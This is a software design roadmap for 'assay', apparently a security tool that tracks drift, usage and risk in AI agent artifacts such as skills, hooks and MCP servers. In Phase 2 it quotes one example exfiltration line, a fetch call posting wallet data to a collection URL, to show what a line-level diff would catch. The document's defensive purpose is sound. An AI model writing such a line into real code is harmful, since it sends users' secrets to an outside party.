# assay — next steps plan (post F–H)

The F–H roadmap is shipped. What's left are (a) the follow-ups deliberately
deferred *inside* F–H, each with a seam already in place, and (b) the one large
unbuilt component. Ordered by leverage-per-effort, every item keeps the project
invariants: **pure IO-free domain core, offline-first, content-free, zero
third-party deps, TDD, demote/degrade never crash.**

Legend — effort: S (~½ day), M (~1–2 days), L (multi-day / needs product input).

---

## Phase 1 — Universal activation telemetry (F1b) · **M · highest leverage**

**Gap.** Usage telemetry (`usage.Summarize`) counts only `audit.KindToolCall`,
which the MCP shim emits keyed by server name. So F1 (last/first used), F2
(sleeper), F3 (live findings), F4 (timeline) light up **only for wrapped MCP
servers**. Skills, subagents, plugins, hooks, rules — the majority of artifacts —
show "no usage signal." Closing this lights up all four F-features for everything,
with no change to their domain logic.

**Mechanism (honest, already-seamed).** Capture an activation event into the same
`~/.assay/audit/<date>.jsonl` the shim writes:
- Claude Code: a `PreToolUse` hook matching the `Skill` and `Task` tools logs
  skill / subagent activation; a `SessionStart`/`UserPromptSubmit` hook can log
  context/rules load. Codex/Cursor get equivalent hooks where they exist.
- The hook shells out to a tiny new command `assay record-use --kind skill
  --name <n>` (or pipes JSON), which appends an `audit.Event`.

**Design (by layer):**
- `internal/domain/audit`: add `KindActivation Kind = "activation"`; the Event
  already has `Tool`/`Server`/`Detail` — reuse `Server` to carry the artifact
  *name* (the existing join key) or add an `Artifact` field if name collisions
  across kinds matter (decide in TDD; prefer reusing the name join to keep
  `usage`/`risk` unchanged).
- `internal/domain/usage`: `Summarize` counts `KindToolCall` **or**
  `KindActivation`. One-line change + tests for the new kind.
- New `internal/cli/recordusecmd.go`: `assay record-use` — pure-ish, writes via
  `auditlog.Sink`. Validate/normalize input; never fail the host tool (exit 0
  even on a bad arg, like the shim's degrade rule).
- New `internal/cli` hook-install: `assay install-hooks [--tool claude-code]`
  writes the hook block into the tool's settings (idempotent, `--status`,
  `--uninstall`), mirroring `wrap`/`unwrap`'s config-rewrite discipline.
- DTO/frontend: **no changes needed** — F1–F4 already render whatever
  `usage`/`timeline` produce; they simply start showing data for non-MCP kinds.

**Tests:** `usage` counts activations; `record-use` appends a redacted event
(never raw args); hook-install round-trips and is idempotent; an end-to-end CLI
test that records an activation and asserts it surfaces in `BuildScan`.

**Risks:** hook formats differ per tool and evolve — keep the writer generic and
the install per-tool behind one interface (same pattern as `discover.Default()`).
Activation ≠ "the risky line ran," only "the artifact was invoked" — document
that honesty, same as the MCP join.

---

## Phase 2 — Trusted-snapshot store + line-level diff (H1b) · **M**

**Gap.** The drift diff (H1) names *which files* changed (`lockfile.DiffFiles`);
it cannot show the literal `+ fetch("https://collect…", {body: walletData})`
line because the lockfile stores hashes, not bytes (deliberately — bytes would
bloat the committable file and churn signatures).

**Design.** A content-addressed blob store for **approved** versions, *outside*
the signed lockfile so the signing-stability invariant holds:
- New `internal/adapters/snapshotstore`: `Put(contentHash, files)` /
  `Get(contentHash) → files` under `.assay/snapshots/<hash>/…` (gitignored or
  opt-in committed; it's the approved baseline, not secret). Written on
  `assay approve`.
- New `internal/domain/textdiff` (pure): a minimal LCS line diff producing
  `+`/`-` hunks. Zero-dep, table-tested. (If hand-rolling LCS is a correctness
  risk, that's the bar for a dep — but a bounded line differ is safe.)
- `dashboard` DTO: extend the existing `FileChanges`/changed-files drawer seam to
  serve per-file hunks when the prior blob is present; degrade to the file-name
  list when it isn't (offline-honest floor stays the default).
- Frontend: red/green hunk view inside the existing **Changed files** section.

**Tests:** `textdiff` golden cases (add/remove/modify, empty, binary→skip);
`snapshotstore` round-trip + GC of unreferenced blobs; DTO degrades to file-level
when no prior blob.

**Risks:** disk growth — store only approved baselines and GC on re-approval;
never store secrets — skip blobs for artifacts with secret-path findings, or
redact via `internal/domain/secrets` before persisting.

---

## Phase 3 — Make the team intelligence enforceable (CI gate) · **S–M**

**Gap.** G1–G3 are *visible* in the dashboard but not *enforced*. A team wants CI
to fail when a machine is out of policy or a drifted artifact has wide blast
radius.

**Design.** `assay fleet verify [--ci]` (extend `fleetcmd.go`):
- Reuse `fleet.CheckConformance` + `fleet.Aggregate` (already pure).
- Exit `1` (the stable drift/policy code) when any machine is non-compliant, or
  when a `drifted`/`quarantine` artifact's blast radius exceeds a threshold.
- Flags mirror `verify --ci`; honor the same `assay.policy.json`.
- Optional: surface usage/sleeper in `assay digest` text (the "dormant 47 days,
  then drifted, then ran" line) and in the GitHub Action summary.

**Tests:** exit-code matrix (compliant → 0, blocked publisher → 1, sleeper → 1);
golden text output.

**Risks:** none structural — it's a read-only rollup over existing pure
functions. Keep thresholds in `assay.policy.json` so they're committed/reviewed.

---

## Phase 4 — Hosted team control plane (Component 3b) · **L · needs product input**

**Gap.** `internal/client` is a stub (`doc.go`); `controlplane/` is only the web
UI. The fleet today aggregates committed snapshots ("git is the backend"), which
caps cleanly at ~15 people. Beyond that, a hosted multi-tenant API.

**Design (same shapes, now over the wire):**
- `internal/client`: a thin HTTP client implementing ports for policy *pull*,
  lockfile/snapshot *submission*, audit *ingest*. Offline stays the default; the
  client is opt-in and degrades to local when unreachable (advisory-feed
  contract).
- `controlplane/` backend: multi-tenant API serving the **same** `BuildScan` /
  `fleet.Aggregate` / `CheckConformance` shapes the local dashboard already
  produces — so the UI is unchanged, only its data source moves.
- AuthN/Z, tenancy, storage (Postgres) — the genuinely new, non-trivial part.

**Why last:** it needs product/infra decisions (hosting, auth model, data
retention, the published privacy contract that also unlocks **H3b** — the live
hash-only reputation lookup behind the existing `reputation.Source` seam). Don't
start until 1–3 prove the local model and the privacy contract is written.

---

## Smaller follow-ups (opportunistic, S each)

- **H2b — true reachability:** upgrade `reach` from a path heuristic to an
  import/call graph (per ecosystem; start with JS/TS entrypoint→import walk).
  Same `reach.Classify` seam; bigger payoff, language-specific effort.
- **Discovery breadth:** more tools/kinds via `discover.Default()` (one-line add
  per the existing pattern).
- **Reputation export:** `assay reputation export` so a team can *build* its own
  hash-only corpus from approved artifacts — feeds H3 without any server.

---

## Recommended order

1. **Phase 1 (F1b)** — biggest UX jump; lights up F1–F4 for all artifact kinds.
2. **Phase 3 (CI gate)** — cheap, turns G1–G3 from advisory into enforced.
3. **Phase 2 (H1b)** — completes the rug-pull "proof" story (line-level diff).
4. **Phase 4 (hosted control plane)** — only after the local model + privacy
   contract are settled.

Each of 1–3 is a self-contained vertical slice (pure domain pkg + thin adapter +
DTO/frontend), TDD-first, `make check` + `tsc` + embedded rebuild before commit —
the same cadence as F–H.
